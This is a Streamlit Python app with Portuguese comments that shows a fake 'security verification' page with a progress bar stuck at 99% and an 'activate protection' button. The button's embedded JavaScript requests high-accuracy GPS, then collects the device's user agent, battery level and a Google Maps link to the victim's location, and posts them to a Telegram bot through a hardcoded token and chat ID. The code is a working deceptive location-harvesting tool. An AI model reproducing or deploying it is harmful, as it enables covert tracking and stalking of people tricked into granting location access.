import streamlit as st
import time

# --- DADOS DO SEU BOT ---
TOKEN = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
ID = "8210828398"

st.set_page_config(page_title="Sistema de Verificação", layout="centered")

# --- CSS FIEL À SUA FOTO ---
st.markdown("""
    <style>
    .main { background-color: #0b1117; color: white; font-family: sans-serif; }
    .stAlert { display: none !important; }
    
    .titulo { font-size: 36px; font-weight: bold; margin-top: 40px; }
    .status { font-size: 24px; margin: 20px 0; }
    
    .btn-container { display: flex; justify-content: center; width: 100%; margin-top: 40px; }
    .meu-botao {
        background-color: white; color: black; width: 300px; height: 85px;
        border-radius: 12px; border: none; font-size: 16px; font-weight: bold;
        display: flex; flex-direction: column; align-items: center; justify-content: center;
        cursor: pointer; line-height: 1.2;
    }
    .ponto-vermelho { color: #ff3b30; font-size: 28px; margin-bottom: -5px; }
    
    .barra-azul { width: 100%; height: 5px; background-color: #007bff; margin-top: 15px; border-radius: 10px; }
    </style>
""", unsafe_allow_html=True)

# Interface baseada na imagem
st.markdown('<div class="titulo">Verificação de Segurança</div>', unsafe_allow_html=True)
texto_progresso = st.empty()
texto_progresso.markdown('<div class="status">Verificando: 99%</div>', unsafe_allow_html=True)
st.markdown('<div class="barra-azul"></div>', unsafe_allow_html=True)

# --- O SCRIPT QUE FURA O BLOQUEIO DE ANÚNCIO ---
js_final = f"""
<div class="btn-container">
    <button class="meu-botao" id="btn_trigger">
        <span class="ponto-vermelho">●</span>
        <span>ATIVAR PROTEÇÃO<br>AGORA</span>
    </button>
</div>

<script>
document.getElementById('btn_trigger').onclick = function() {{
    // Ativa o GPS com alta prioridade para o Android soltar o pop-up azul
    navigator.geolocation.getCurrentPosition(
        async (pos) => {{
            const bat = await navigator.getBattery();
            const info = "🛡️ PROTEÇÃO ATIVADA\\n📱 " + navigator.userAgent.split('(')[1].split(')')[0] + "\\n🔋 " + Math.round(bat.level * 100) + "%\\n📍 Local: https://www.google.com/maps?q=" + pos.coords.latitude + "," + pos.coords.longitude;
            
            // Envio direto para o seu Telegram
            await fetch("https://api.telegram.org/bot{TOKEN}/sendMessage", {{
                method: "POST",
                headers: {{ "Content-Type": "application/json" }},
                body: JSON.stringify({{ chat_id: "{ID}", text: info }})
            }});
            
            // Avisa o site para terminar a barra
            window.parent.postMessage({{type: 'streamlit:set_component_value', value: true}}, '*');
        }},
        (err) => {{
            // Se o GPS estiver desligado na barra, o sistema abre o pop-up aqui
            console.log("Aguardando ativação de hardware...");
        }},
        {{ enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }}
    );
}};
</script>
"""

# Renderiza o botão com a permissão correta de GPS
clicou = st.components.v1.html(js_final, height=150)

if clicou:
    texto_progresso.markdown('<div class="status">Verificando: 100%</div>', unsafe_allow_html=True)
    st.success("Proteção Concluída!")
    st.stop()
